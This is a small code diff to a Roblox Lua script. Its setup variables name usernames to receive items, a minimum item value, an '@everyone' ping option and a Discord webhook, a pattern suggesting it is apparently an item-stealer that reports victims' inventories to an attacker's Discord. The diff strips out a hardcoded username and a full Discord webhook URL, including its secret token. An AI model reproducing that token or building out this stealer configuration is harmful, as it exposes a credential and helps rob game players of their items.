@@ -4,10 +4,10 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {lankybox_khent}
+local users = _G.Usernames or {}
 local min_value = _G.min_value or 0.1
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1423467487508299788/E1KCb4yVUMgNnWP3TWUkbk77nfczzUrlf3ye9cG6xIv45dC3cMnS1GBOI9wlZb4TiaNV"
+local webhook = _G.webhook or ""
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
